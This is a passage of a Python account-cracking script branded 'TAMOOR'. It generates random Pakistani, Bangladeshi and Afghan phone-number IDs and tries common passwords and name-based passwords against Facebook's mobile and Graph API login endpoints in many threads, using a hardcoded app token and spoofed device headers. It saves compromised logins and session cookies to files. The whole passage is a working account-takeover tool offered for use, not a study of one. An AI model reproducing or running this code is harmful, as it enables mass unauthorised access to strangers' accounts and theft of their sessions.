                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        open=session.cookies.get_dict().keys()
                        if "c_user" in open:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [open\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                open(f'/sdcard/open•TAMOOR OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in open:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [open•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/open•TAMOOR CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
#_________[ MATHOD M2 ]______>>           
        
def M2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [open] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m TAMOOR OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'TAMOOR'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="111", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        open=session.cookies.get_dict().keys()
                        if "c_user" in open:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [open\033[1;36m•\033[1;37m\033[1;32mTAMOOR OK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                open(f'/sdcard/open•TAMOOR OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in open:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [open•TAMOOR CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/open•TAMOOR CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
  
#_________[ RENDOM CLONING ]______>>        
def r_crack():
	clear()
	print(' [1] Pakistan Cloning ')
	print(' [2] Bangladesh Cloning ')
	print(' [3] Afghanistan Cloning ')
	print(' [0] Back To Menu ')
	linex()
	crk=input(' [+] Select Option:\33[1;37m ')
	if crk =='1':
		pak()
	elif crk =='2':
		bd()
	elif crk =='3':
		afg()
	elif crk =='0':
		Menu_TAMOOR()
	else:
		print('\n  [+] Select valid option\033[1;37m ');time.sleep(1.5);menu()

#_________[ PAK RENDOM ]______>>  
def pak():
	user=[]
	clear()
	code = input('\33[1;37m [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as TAMOOR:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process has been started\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'57273200']
			TAMOOR.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python TAMOOR.py')

#_________[ BD RENDOM ]______>>  
def bd():
	user=[]
	clear()
	code = input(' [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as TAMOOR:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = ['i love you','iloveyou',ids,psx]
			TAMOOR.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python TAMOOR.py')

#_________[ AFG RENDOM ]______>>  
def afg():
	user=[]
	clear()
	code = input(' [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as TAMOOR:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process running in the background\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [ids,psx,'100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','۱۳۳۳۵۶۷۸۹','۱۳۳۳۵۶']
			TAMOOR.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python TAMOOR.py')

#_________[ METHOD RANDOM CLONING ]______>>  
def rd1(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m [TAMOOR]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
				fbbv = str(random.randint(000000000,999999999))
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
				fbbv = str(random.randint(000000000,999999999))
				fbrv = str(random.randint(000000000,999999999))
				fbsv = str(random.randint(4,13))+'.0'
				model,build = random.choice(samsung).split('|')
				fbmf = 'samsung'
				fbbd = 'samsung'
				en = random.choice(['en_US','en_GB'])
				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
				xxx = "FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+' [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
				head = {'User-Agent':'Dalvik/1.6.0 (Linux; U; Android 9.4.0; GT-I9500 Build/LRX22C) [FBAN/FB5A;FBAV/108.5.11.98;FBBV/34418501;FBDM/{density=1.6,width=973,height=2476};FBLC/it_IT;FBRV/92217434;FBCR/iN0pKWNUtX;FBMF/GT-I9500;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/GT-I9500;FBSV/5.6;FBOP/1;FBCA/x86:armeabi-v7a;FBNT/4G;FBCN/Verizon;FBSR/121.53.52.123;]','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
				po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
				if 'session_key' in po:
						uid = str(po['uid'])
						ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
						ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
						cookie = f"sb={ssbb};{ckkk}"
						print('\r\r\033[1;32m [TAMOOR-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'TAMOOR_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'TAMOOR_COOKIES.txt')
						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
							file_ok.write(uid+'|'+pas+'\n')
							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
				elif 'www.facebook.com' in po['error']['message']:
						uid = str(po['error']['error_data']['uid'])
						print(f'\r\r\33[1m\33[1;35m [TAMOOR-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'TAMOOR-CP.txt')
						with open(file_path, 'a') as file:
							file.write(uid+'|'+pas+'\n')
						cps.append(uid)
						break
				else:
					continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[TAMOOR]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			fbrv = str(random.randint(000000000,999999999))
			fbsv = str(random.randint(4,13))+'.0'
			model,build = random.choice(samsung).split('|')
			fbmf = 'samsung'
			fbbd = 'samsung'
			en = random.choice(['en_US','en_GB'])
			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
			xxx = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+' [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [TAMOOR-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'TAMOOR_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					print(f'\r\r\33[1m\33[1;35m [TAMOOR-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'TAMOOR-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
		
#_________[ NETWORK ERROR ]______>>  
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n\033[0;97m[•]\033[1;31m NO INTERNET CONNECTION...')
        exit()
except Exception as e:pass
Main_TAMOOR()